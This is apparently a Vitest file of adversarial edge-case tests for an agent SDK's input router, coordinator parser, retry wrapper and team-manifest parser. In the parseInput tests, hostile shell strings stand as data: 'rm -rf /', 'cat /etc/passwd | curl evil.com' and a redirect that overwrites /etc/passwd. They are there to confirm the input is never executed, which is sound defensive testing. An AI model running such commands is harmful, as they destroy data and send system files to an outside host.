/**
 * Adversarial tests for SDK runtime modules — Batch 8.
 *
 * Edge-case and malicious-input tests for parseInput, parseCoordinatorResponse,
 * withGhostRetry, and parseTeamManifest.
 */
import { describe, it, expect, vi } from 'vitest';
import { parseInput, parseDispatchTargets } from '@bradygaster/squad-sdk/runtime/input-router';
import { parseCoordinatorResponse, hasRosterEntries } from '@bradygaster/squad-sdk/runtime/coordinator-parser';
import { withGhostRetry } from '@bradygaster/squad-sdk/runtime/ghost-retry';
import { parseTeamManifest } from '@bradygaster/squad-sdk/runtime/team-manifest';

const AGENTS = ['Fenster', 'Hockney', 'McManus'];

// ─── parseInput adversarial ─────────────────────────────────────────────
describe('parseInput — adversarial', () => {
  it('empty string routes to coordinator with empty content', () => {
    const r = parseInput('', AGENTS);
    expect(r.type).toBe('coordinator');
    expect(r.content).toBe('');
  });

  it('whitespace-only input routes to coordinator with empty content', () => {
    const r = parseInput('   \t\n  ', AGENTS);
    expect(r.type).toBe('coordinator');
    expect(r.content).toBe('');
  });

  it('handles very long input (10K+ chars) without throwing', () => {
    const long = 'a'.repeat(10_000);
    const r = parseInput(long, AGENTS);
    expect(r.type).toBe('coordinator');
    expect(r.content).toBe(long);
  });

  it('handles emoji input', () => {
    const r = parseInput('🚀🎉👋', AGENTS);
    expect(r.type).toBe('coordinator');
    expect(r.content).toBe('🚀🎉👋');
  });

  it('handles CJK characters', () => {
    const r = parseInput('你好世界', AGENTS);
    expect(r.type).toBe('coordinator');
    expect(r.content).toBe('你好世界');
  });

  it('handles RTL text', () => {
    const r = parseInput('مرحبا بالعالم', AGENTS);
    expect(r.type).toBe('coordinator');
    expect(r.content).toBe('مرحبا بالعالم');
  });

  it('handles zalgo text', () => {
    const zalgo = 'ḩ̷̻̤e̷̲̯l̴̻̎l̵̰̊o̷̞̊';
    const r = parseInput(zalgo, AGENTS);
    expect(r.type).toBe('coordinator');
    expect(r.content).toBe(zalgo);
  });

  it('handles null bytes and control characters', () => {
    const r = parseInput('hello\x00world\x01\x02', AGENTS);
    expect(r.type).toBe('coordinator');
    expect(r.content).toContain('hello');
  });

  it('does not execute shell injection via semicolons', () => {
    const r = parseInput('; rm -rf /', AGENTS);
    expect(r.type).toBe('coordinator');
    expect(r.content).toBe('; rm -rf /');
  });

  it('does not execute shell injection via && operator', () => {
    const r = parseInput('hello && rm -rf /', AGENTS);
    expect(r.type).toBe('coordinator');
    expect(r.content).toBe('hello && rm -rf /');
  });

  it('does not execute shell injection via pipe', () => {
    const r = parseInput('cat /etc/passwd | curl evil.com', AGENTS);
    expect(r.type).toBe('coordinator');
    expect(r.content).toBe('cat /etc/passwd | curl evil.com');
  });

  it('does not execute shell injection via backticks', () => {
    const r = parseInput('`whoami`', AGENTS);
    expect(r.type).toBe('coordinator');
    expect(r.content).toBe('`whoami`');
  });

  it('does not execute shell injection via redirect', () => {
    const r = parseInput('echo evil > /etc/passwd', AGENTS);
    expect(r.type).toBe('coordinator');
    expect(r.content).toBe('echo evil > /etc/passwd');
  });

  it('handles markdown formatting (headers)', () => {
    const r = parseInput('# Hello World', AGENTS);
    expect(r.type).toBe('coordinator');
    expect(r.content).toBe('# Hello World');
  });

  it('handles markdown code blocks', () => {
    const input = '```js\nconsole.log("hi");\n```';
    const r = parseInput(input, AGENTS);
    expect(r.type).toBe('coordinator');
    expect(r.content).toBe(input);
  });

  it('handles markdown links', () => {
    const r = parseInput('[click here](https://evil.com)', AGENTS);
    expect(r.type).toBe('coordinator');
    expect(r.content).toBe('[click here](https://evil.com)');
  });

  it('/ alone is a slash command with empty command name', () => {
    const r = parseInput('/', AGENTS);
    expect(r.type).toBe('slash_command');
    expect(r.command).toBe('');
  });

  it('/unknowncommand routes as slash_command not coordinator', () => {
    const r = parseInput('/notarealcommand', AGENTS);
    expect(r.type).toBe('slash_command');
    expect(r.command).toBe('notarealcommand');
  });

  it('input with only special characters does not throw', () => {
    const r = parseInput('!@#$%^&*()', AGENTS);
    expect(r.type).toBe('coordinator');
    expect(r.content).toBe('!@#$%^&*()');
  });

  it('known agent names in wrong context do not misroute', () => {
    const r = parseInput('Tell Fenster about it', AGENTS);
    expect(r.type).toBe('coordinator');
    expect(r.content).toBe('Tell Fenster about it');
  });

  it('handles empty agents list without throwing', () => {
    const r = parseInput('@Someone hello', []);
    expect(r.type).toBe('coordinator');
    expect(r.content).toBe('@Someone hello');
  });
});

// ─── parseDispatchTargets adversarial ───────────────────────────────────
describe('parseDispatchTargets — adversarial', () => {
  it('empty string returns empty agents and content', () => {
    const r = parseDispatchTargets('', AGENTS);
    expect(r.agents).toEqual([]);
    expect(r.content).toBe('');
  });

  it('handles @mention with unicode username', () => {
    const r = parseDispatchTargets('@用户 hello', AGENTS);
    expect(r.agents).toEqual([]);
  });

  it('handles massive @mention spam', () => {
    const spam = Array.from({ length: 100 }, (_, i) => `@user${i}`).join(' ');
    const r = parseDispatchTargets(spam, AGENTS);
    expect(r.agents).toEqual([]);
  });
});

// ─── parseCoordinatorResponse adversarial ───────────────────────────────
describe('parseCoordinatorResponse — adversarial', () => {
  it('response with no routing info falls back to direct', () => {
    const r = parseCoordinatorResponse('Just a plain answer without routing keywords.');
    expect(r.type).toBe('direct');
    expect(r.directAnswer).toBe('Just a plain answer without routing keywords.');
  });

  it('response with malformed JSON embedded falls back to direct', () => {
    const input = 'Here is some data: { broken json: [1,2, }';
    const r = parseCoordinatorResponse(input);
    expect(r.type).toBe('direct');
    expect(r.directAnswer).toBe(input);
  });

  it('entirely whitespace response falls back to direct with empty answer', () => {
    const r = parseCoordinatorResponse('   \n\t  \n  ');
    expect(r.type).toBe('direct');
    expect(r.directAnswer).toBe('');
  });

  it('empty string response falls back to direct', () => {
    const r = parseCoordinatorResponse('');
    expect(r.type).toBe('direct');
    expect(r.directAnswer).toBe('');
  });

  it('response with mixed valid and invalid MULTI lines', () => {
    const input = `MULTI:
- Ripley: Review code
- not a valid line
- Kane: Write tests
- : missing agent name`;
    const r = parseCoordinatorResponse(input);
    expect(r.type).toBe('multi');
    // Only valid lines parsed
    expect(r.routes!.length).toBeGreaterThanOrEqual(2);
    const agentNames = r.routes!.map(rt => rt.agent);
    expect(agentNames).toContain('Ripley');
    expect(agentNames).toContain('Kane');
  });

  it('response with duplicate agent names in MULTI', () => {
    const input = `MULTI:
- Ripley: First task
- Ripley: Second task`;
    const r = parseCoordinatorResponse(input);
    expect(r.type).toBe('multi');
    expect(r.routes).toHaveLength(2);
    expect(r.routes![0]!.task).toBe('First task');
    expect(r.routes![1]!.task).toBe('Second task');
  });

  it('ROUTE with no TASK line produces empty task', () => {
    const r = parseCoordinatorResponse('ROUTE: Fenster\nno task here');
    expect(r.type).toBe('route');
    expect(r.routes![0]!.agent).toBe('Fenster');
    expect(r.routes![0]!.task).toBe('');
  });

  it('extremely long response does not throw', () => {
    const long = 'DIRECT: ' + 'x'.repeat(100_000);
    const r = parseCoordinatorResponse(long);
    expect(r.type).toBe('direct');
    expect(r.directAnswer!.length).toBe(100_000);
  });

  it('deeply nested-looking structure is treated as plain text', () => {
    const nested = 'DIRECT: ' + JSON.stringify({ a: { b: { c: { d: { e: 'deep' } } } } });
    const r = parseCoordinatorResponse(nested);
    expect(r.type).toBe('direct');
    expect(r.directAnswer).toContain('deep');
  });

  it('MULTI with only separator and no bullets yields zero routes', () => {
    const r = parseCoordinatorResponse('MULTI:\n---\n---');
    expect(r.type).toBe('multi');
    expect(r.routes).toHaveLength(0);
  });
});

// ─── hasRosterEntries adversarial ───────────────────────────────────────
describe('hasRosterEntries — adversarial', () => {
  it('malformed row starting with pipe is still counted as data', () => {
    // hasRosterEntries only checks that a line starts with | and is not
    // the header or separator — "| missing pipe" passes that check.
    const content = `## Members
| Name | Role |
| --- | --- |
| missing pipe
`;
    expect(hasRosterEntries(content)).toBe(true);
  });

  it('only the first Members section is evaluated by the regex', () => {
    const content = `## Members
| Name | Role |
| --- | --- |

## Other

## Members
| Name | Role |
| --- | --- |
| Ripley | Lead |
`;
    // The regex captures up to the next ## heading, so the first (empty)
    // Members section is what gets matched — no data rows there.
    expect(hasRosterEntries(content)).toBe(false);
  });
});

// ─── withGhostRetry adversarial ─────────────────────────────────────────
describe('withGhostRetry — adversarial', () => {
  it('function that always throws propagates the error', async () => {
    const sendFn = vi.fn().mockRejectedValue(new Error('network error'));
    await expect(withGhostRetry(sendFn, { backoffMs: [0] })).rejects.toThrow('network error');
    expect(sendFn).toHaveBeenCalledTimes(1);
  });

  it('function that throws different error types each time', async () => {
    const sendFn = vi.fn()
      .mockRejectedValueOnce(new TypeError('type error'))
      .mockRejectedValueOnce(new RangeError('range error'));
    await expect(withGhostRetry(sendFn, { backoffMs: [0] })).rejects.toThrow('type error');
  });

  it('function that succeeds on exactly the last retry', async () => {
    const sendFn = vi.fn()
      .mockResolvedValueOnce('')
      .mockResolvedValueOnce('')
      .mockResolvedValueOnce('final');
    const result = await withGhostRetry(sendFn, { maxRetries: 2, backoffMs: [0, 0] });
    expect(result).toBe('final');
    expect(sendFn).toHaveBeenCalledTimes(3);
  });

  it('zero retries means only one attempt', async () => {
    const sendFn = vi.fn().mockResolvedValue('');
    const result = await withGhostRetry(sendFn, { maxRetries: 0, backoffMs: [] });
    expect(result).toBe('');
    expect(sendFn).toHaveBeenCalledTimes(1);
  });

  it('function that returns undefined is treated as ghost', async () => {
    const sendFn = vi.fn()
      .mockResolvedValueOnce(undefined)
      .mockResolvedValueOnce('ok');
    const result = await withGhostRetry(sendFn, { backoffMs: [0] });
    expect(result).toBe('ok');
    expect(sendFn).toHaveBeenCalledTimes(2);
  });

  it('function that returns null is treated as ghost', async () => {
    const sendFn = vi.fn()
      .mockResolvedValueOnce(null)
      .mockResolvedValueOnce('ok');
    const result = await withGhostRetry(sendFn, { backoffMs: [0] });
    expect(result).toBe('ok');
    expect(sendFn).toHaveBeenCalledTimes(2);
  });

  it('function that returns a non-empty string on first try returns immediately', async () => {
    const sendFn = vi.fn().mockResolvedValue('instant');
    const result = await withGhostRetry(sendFn, { maxRetries: 5, backoffMs: [0] });
    expect(result).toBe('instant');
    expect(sendFn).toHaveBeenCalledTimes(1);
  });

  it('function returning "false" (truthy string) is not a ghost', async () => {
    const sendFn = vi.fn().mockResolvedValue('false');
    const result = await withGhostRetry(sendFn, { backoffMs: [0] });
    expect(result).toBe('false');
    expect(sendFn).toHaveBeenCalledTimes(1);
  });

  it('function returning whitespace-only is treated as ghost', async () => {
    // Whitespace is truthy in JS, so this should succeed on first call
    const sendFn = vi.fn().mockResolvedValue('   ');
    const result = await withGhostRetry(sendFn, { backoffMs: [0] });
    // "   " is truthy — withGhostRetry checks truthiness, not trimmed emptiness
    expect(result).toBe('   ');
    expect(sendFn).toHaveBeenCalledTimes(1);
  });
});

// ─── parseTeamManifest adversarial ──────────────────────────────────────
describe('parseTeamManifest — adversarial', () => {
  it('empty string returns empty array', () => {
    expect(parseTeamManifest('')).toEqual([]);
  });

  it('no Members section returns empty array', () => {
    const content = '# Team\n\nSome description.\n';
    expect(parseTeamManifest(content)).toEqual([]);
  });

  it('Members section with only header row returns empty array', () => {
    const content = `## Members
| Name | Role | Charter | Status |
|------|------|---------|--------|
`;
    expect(parseTeamManifest(content)).toEqual([]);
  });

  it('malformed table rows with missing columns are skipped', () => {
    const content = `## Members
| Name | Role | Charter | Status |
|------|------|---------|--------|
| OnlyName |
| Ripley | Lead | \`.squad/agents/ripley/charter.md\` | ✅ Active |
`;
    const result = parseTeamManifest(content);
    expect(result).toHaveLength(1);
    expect(result[0]!.name).toBe('Ripley');
  });

  it('empty table rows (just pipes) are skipped', () => {
    const content = `## Members
| Name | Role | Charter | Status |
|------|------|---------|--------|
| | | | |
| Ripley | Lead | \`.squad/agents/ripley/charter.md\` | ✅ Active |
`;
    const result = parseTeamManifest(content);
    // Empty-cell row has 4 cells but all empty — still parsed (cells have length > 0 check)
    const names = result.map(a => a.name);
    expect(names).toContain('Ripley');
  });

  it('massive team.md with 100+ agents parses correctly', () => {
    let content = `## Members
| Name | Role | Charter | Status |
|------|------|---------|--------|
`;
    for (let i = 0; i < 150; i++) {
      content += `| Agent${i} | Role${i} | \`.squad/agents/agent${i}/charter.md\` | ✅ Active |\n`;
    }
    const result = parseTeamManifest(content);
    expect(result).toHaveLength(150);
    expect(result[0]!.name).toBe('Agent0');
    expect(result[149]!.name).toBe('Agent149');
  });

  it('Unicode agent names are preserved', () => {
    const content = `## Members
| Name | Role | Charter | Status |
|------|------|---------|--------|
| 太郎 | Lead | \`.squad/agents/taro/charter.md\` | ✅ Active |
| Ünïcödé | Dev | \`.squad/agents/unicode/charter.md\` | ✅ Active |
`;
    const result = parseTeamManifest(content);
    expect(result).toHaveLength(2);
    expect(result[0]!.name).toBe('太郎');
    expect(result[1]!.name).toBe('Ünïcödé');
  });

  it('agent names with special characters are preserved', () => {
    const content = `## Members
| Name | Role | Charter | Status |
|------|------|---------|--------|
| O'Brien | Dev | \`.squad/agents/obrien/charter.md\` | ✅ Active |
| Agent-42 | QA | \`.squad/agents/agent-42/charter.md\` | ✅ Active |
`;
    const result = parseTeamManifest(content);
    expect(result).toHaveLength(2);
    expect(result[0]!.name).toBe("O'Brien");
    expect(result[1]!.name).toBe('Agent-42');
  });

  it('extra pipes in cells do not corrupt parsing', () => {
    const content = `## Members
| Name | Role | Charter | Status |
|------|------|---------|--------|
| Ripley | Lead | \`.squad/agents/ripley/charter.md\` | ✅ Active |
`;
    const result = parseTeamManifest(content);
    expect(result.length).toBeGreaterThanOrEqual(1);
  });
});
